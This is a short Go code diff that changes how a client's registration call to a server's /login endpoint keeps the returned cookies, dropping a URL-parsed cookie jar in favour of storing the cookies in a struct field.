@@ -8,7 +8,6 @@ import (
 	"github.com/pygrum/Empress/transport"
 	log "github.com/sirupsen/logrus"
 	"net/http"
-	"net/url"
 	"os"
 	"os/user"
 	"runtime"
@@ -24,10 +23,6 @@ func (c *Client) Register(regInfo *transport.Registration) error {
 		return err
 	}
 	addr := c.Address + "/login"
-	u, err := url.Parse(c.Address) // use address rather than /login so we can use cookies with it
-	if err != nil {
-		return err
-	}
 	req, err := http.NewRequest(http.MethodGet, addr, bytes.NewReader(data))
 	if err != nil {
 		return err
@@ -41,7 +36,7 @@ func (c *Client) Register(regInfo *transport.Registration) error {
 		return errors.New("")
 	}
 	log.Info("received cookies: %v", resp.Cookies())
-	c.HttpClient.Jar.SetCookies(u, resp.Cookies())
+	c.cookieJar = resp.Cookies()
 	return nil
 }
 
